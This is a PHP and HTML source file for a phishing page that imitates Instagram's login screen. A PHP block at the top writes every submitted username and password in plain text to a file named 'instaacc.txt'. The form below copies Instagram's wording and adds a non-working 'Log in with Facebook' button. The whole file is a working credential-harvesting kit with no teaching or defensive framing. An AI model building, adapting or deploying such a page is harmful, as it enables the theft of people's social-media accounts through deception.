<?php

 if(isset($_POST['submit']))
 {
  $username = $_POST['username'];
  $password = $_POST['password'];
  $text = "username: ". $username . " , " . "password: " . $password . "\n";
  $fp = fopen('instaacc.txt', 'a+');

    if(fwrite($fp, $text))  {
        

    }
fclose ($fp);    
}
?>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login Page</title>
    <link rel="stylesheet" href="instagram.css" />
  </head>
  <body>
    <div class="container">
        <a class="button-2" href="index.php" role="button" style="text-decoration: none;">.</a>
    </div>
    <div class="container">
        <div class="box">
            <div class="heading"></div>
            <form class="login-form" action="instagram.php" method="post">
                <div class="field">
                    <input id="username" type="name" name="username" placeholder="Phone number, username, or email" />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="password" type="password" name="password" placeholder="password" />
                    <label for="password">Password</label>
                </div>
                <button class="login-button" title="login" name="submit">Log In</button>
                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="other">
                    <button class="fb-login-btn" type="button">
                        <i class="fa fa-facebook-official fb-icon"></i>
                        <span class="">Log in with Facebook</span>
                    </button>
                    <a class="forgot-password" href="#">Forgot password?</a>
                </div>
            </form>
        </div>
        <div class="box">
            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
        </div>
    </div>
</div>
</body>
